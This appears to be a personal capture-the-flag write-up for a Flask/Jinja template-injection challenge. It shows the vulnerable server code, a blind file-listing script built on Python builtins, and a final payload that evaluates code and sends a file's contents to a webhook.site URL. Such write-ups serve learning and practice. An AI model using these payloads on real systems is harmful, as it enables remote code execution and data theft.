# litter

this one was really hard for me because the Jinja docs are not detailed enough

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/c7fc4768-7b5b-4b3d-b86c-3093ebf8ba5a)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/cc3322d7-6377-4527-91da-e44618b2e3f1)

server.py
```py
#!/usr/bin/env python3

from flask import Flask, request, Response, redirect, render_template_string, url_for
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
Flask.jinja_options = {'line_statement_prefix': '|'}
app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["50000 per hour"],
    storage_uri="memory://",
)

@app.route('/', methods=["GET"])
@limiter.limit("2/second")
def index():
    if "source" in request.args:
        return Response(open(__file__).read(), mimetype='text/plain')
    return open("index.html").read()

@app.route('/docker', methods=["GET"])
@limiter.limit("2/second")
def docker():
    return Response(open("Dockerfile").read(), mimetype='text/plain')

@app.route('/create', methods=["POST"])
@limiter.limit("2/second")
def create():
    trash = request.form['trash']
    return redirect(url_for("view_user", trash=trash))

@app.route('/user', methods=["GET"])
@limiter.limit("2/second")
def view_user():
    trash = request.args.get("trash", None)
    if len(trash) > 100:
        return "Too much trash!"
    if any(i in trash for i in "{}"):
        return "Unsafe characters found!"
    return render_template_string(f'''
        {trash}
    ''',trash=trash)

if __name__ == "__main__":
    app.run('0.0.0.0', 15004)
```

## solution

notice the `|` line statement prefix

looking at the jinja docs

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/7fb9d085-5072-4b66-b4a3-5925e0361448)

notably, to minimize characters we can use an "if" statement

like this:
```
|if 1==1
2
|endif
```

first, i tried getting to builtins, which was hard, but then i made this crazy script equivalent to the `ls` command

```py
from requests import get
from time import sleep
from math import log2


chars = "".join([chr(_) for _ in range(32, 127) if chr(_) not in "{}\""])

# also used comparisons

i2 = 4

url = lambda i1, c: f"http://puzzler7.imaginaryctf.org:15004/user?trash=%7Cif+e.__init__.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D(%27os%27).listdir()%5B{i2}%5D%5B{i1}%5D%3E%22%{hex(ord(c))[2:]}%22%0A!%0A%7Cendif"
url2 = lambda i1, c: f"http://puzzler7.imaginaryctf.org:15004/user?trash=%7Cif+e.__init__.__globals__%5B%27__builtins__%27%5D%5B%27__import__%27%5D(%27os%27).listdir()%5B{i2}%5D%5B{i1}%5D==%22%{hex(ord(c))[2:]}%22%0A!%0A%7Cendif"


total = "zzz_theres_no_way_this_file_shows_up"
for index in range(len(total), 100):
    left = 0
    before_total = total
    right = len(chars)
    for _ in range(0, int(log2(len(chars))+1)):
        sleep(1.3)
        char = chars[int(left/2+right/2)]
        if (resp := get(url(index, char)).text) == "\x0a!\x0a":
            left = int(left/2+right/2)
        else:
            right = int(left/2+right/2)
    sleep(1.3)
    if (resp := get(url2(index, chars[left])).text) == "\x0a!\x0a":
        total += chars[left]
    # print(chars[left], resp)
    sleep(1.3)
    if (resp := get(url2(index, chars[right])).text) == "\x0a!\x0a":
        total += chars[right]
    # print(chars[right], resp)
    sleep(1.3)
    if (resp := get(url2(index, chars[left-1])).text) == "\x0a!\x0a":
        total += chars[left-1]
    # print(chars[left-1], resp)
    sleep(1.3)
    if (resp := get(url2(index, chars[left-2])).text) == "\x0a!\x0a":
        total += chars[left-2]
    # print(chars[left-2], resp)
    sleep(1.3)
    if (resp := get(url2(index, chars[right+1])).text) == "\x0a!\x0a":
        total += chars[right+1]
    # print(chars[right+1], resp)
    sleep(1.3)
    if len(total) == len(before_total):
        print(total, "!!!", chars[left-5:right+5], len(total), len(before_total))
        break
    print(total)


# 0: x.txt
# 1: Dockerfile
# 2: index.html
# 3: docker-compose.yml
# 4: zzz_theres_no_way_this_...
# 5: server.py
```

this does a binary search where it compares each letter like `'a'>'b'` is False and so boolean expressions can be used to determine each file name in os.listdir

one way that we can save characters is by leaving out the carriage return character that windows puts (instead of just `\x0a`, windows puts `\x0d\x0a`)

anyways my real solution was to utilize request.args to eval an arbitrarily long piece of code with another argument

```
http://puzzler7.imaginaryctf.org:15004/user?trash=%7Cif+e.__init__.__globals__%5B%27__builtins__%27%5D%5B%27eval%27%5D(request.args.c)%0D%0A!%0D%0A%7Cendif&c=%5F%5Fimport%5F%5F%28%27urllib%27%29%2Erequest%2Eurlopen%28%27https%3A%2F%2Fwebhook%2Esite%2F<REDACTED>%27%20%2B%20open%28%22zzz%5Ftheres%5Fno%5Fway%5Fthis%5Ffile%5Fshows%5Fup%5Ffirst%2Etxt%22%29%2Eread%28%29%29
```

it was such a pain to do this challenge and i dont like it

also i didn't know that `|print(thing)` was possible (not in the documentation afaik!!!! why, i dont know) so i had to use urllib requests to send my request to a webhook.site url
